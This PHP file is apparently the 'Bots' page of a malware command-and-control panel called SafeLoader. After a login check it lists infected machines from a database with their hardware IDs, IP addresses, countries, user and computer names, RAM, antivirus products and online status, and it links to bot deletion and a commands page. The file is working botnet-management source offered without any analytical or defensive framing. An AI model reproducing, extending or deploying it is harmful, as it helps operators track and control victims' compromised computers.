<?php
@session_start();

    if (!isset($_SESSION['login'])) {
        header('Location: index.php');
        exit();
    }
	
    include_once('includes/config.php');
	include_once('includes/stats.php');
	include_once('includes/update_bots.php');
	
	$list = htmlentities($_GET["l"]);
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>SafeLoader - Bots</title>
        <meta charset="utf-8" />
        <link rel="stylesheet" type="text/css" href="css/main.css" />
    </head>
    <body>
        <aside>
            <h1><font style="text-shadow: 2px -2px 3px #2580A2, -2px -2px 3px #2580A2, -2px 2px 3px #2580A2, 2px 2px 3px #2580A2;">SafeLoader</font></h1>
            <nav>
                <ul>
                    <li class='first'>
                        <a href='stats.php'>Stats</a>
                    </li>
                    <li>
                        <a class='active' href='bots.php'>Bots</a>
                    </li>
                    <li>
                        <a href='commands.php'>Commands</a>
                    </li>
					<li>
                        <a href='includes/logout.php'>Logout</a>
                    </li>
                </ul>
           </nav>
		   <ul>
<?php
    echo '             <li class="title">General Statistics</li>' . PHP_EOL;
    echo '		       <li>Online Bots: ' . $onlinecount . '</li>' . PHP_EOL;
    echo '			   <li>Offline Bots: ' . $offlinecount . '</li>' . PHP_EOL;
    echo '			   <li>Dead Bots: ' . $deadcount . '</li>' . PHP_EOL;
    echo '			   <li>---------------------------------------------------</li>' . PHP_EOL;
    echo '			   <li>Total Bots: ' . $statustotal . '</li>' . PHP_EOL;
?>
		   </ul>
        </aside>
        <section class="stats">
            <article>
                <table id="bots">
                    <thead>
                   	    <tr>
                            <th>ID</th>
							<th>HWID</th>
                            <th>IP</th>
                            <th>Country</th>
                            <th>SO</th>
                            <th>User@Computer</th>
                            <th>RAM</th>
                            <th>AntiVirus</th>
							<th>Status</th>
							<th></th>
                         </tr>
                    </thead>
                    <tbody>
<?php
    if($list == NULL){
	    $list = 0;
	    $index = 0;
	}
	
	$index = ceil($list * $bot_max_show);
	
	$result = mysql_query('SELECT id, hwid, ip, country, countrycode, so, userpc, ram, av, status FROM bots ORDER BY status DESC LIMIT ' . $index . ',' . $bot_max_show); 
    while ($row = mysql_fetch_row($result))
    { 
	    echo '                   	  <tr>'.PHP_EOL;
        echo '                            <td>#'.$row[0].'</td>'.PHP_EOL;
		echo '                            <td>'.$row[1].'</td>'.PHP_EOL;
		echo '                            <td>'.$row[2].'</td>'.PHP_EOL;
		echo '                            <td><img src="images/flags/'.strtolower($row[4]).'.png">'.$row[3].'</td>'.PHP_EOL;
		echo '                            <td>'.$row[5].'</td>'.PHP_EOL;
		echo '                            <td>'.$row[6].'</td>'.PHP_EOL;
		echo '                            <td>'.$row[7].'</td>'.PHP_EOL;
		echo '                            <td>'.$row[8].'</td>'.PHP_EOL;
		If ($row[9] == "Online"){
		    echo '                            <td><font color="green">'.$row[9].'</font></td>'.PHP_EOL;
		}
		If ($row[9] == "Offline"){
		    echo '                            <td><font color="red">'.$row[9].'</font></td>'.PHP_EOL;
		}
		If ($row[9] == "Dead"){
		    echo '                            <td><font color="black">'.$row[9].'</font></td>'.PHP_EOL;
		}
		echo '                            <td><a href="includes/delete_bot.php?id=' . $row[0] . '"><img src="images/delete.png"></a></td>'.PHP_EOL;
		echo '                   	  </tr>'.PHP_EOL;
    } 
	
 	echo '                   </tbody>'.PHP_EOL;
	echo '                </table>'.PHP_EOL;
	
	$result2 = mysql_query('SELECT * FROM bots');
	$row2 = mysql_num_rows($result2);
	$total = ceil($row2 / $bot_max_show) - 1;
	
	echo '                <center>'.PHP_EOL;
	echo '                    <font color="black">'.PHP_EOL;
	echo '                        <br>'.PHP_EOL;
	
	for ($count = 0; $count <= $total; $count++) {
	    If ($count == $list){
	        echo '                        <a href="bots.php?l=' . $count . '"><b>[' . $count . '] </b></a>'.PHP_EOL;
		} else {
		    echo '                        <a href="bots.php?l=' . $count . '"><b>[' . $count . '] </b>'.PHP_EOL;
		}
	}
?>
                        </br>
					</font>
                </center>
            </article>
        </section>
    </body>
</html>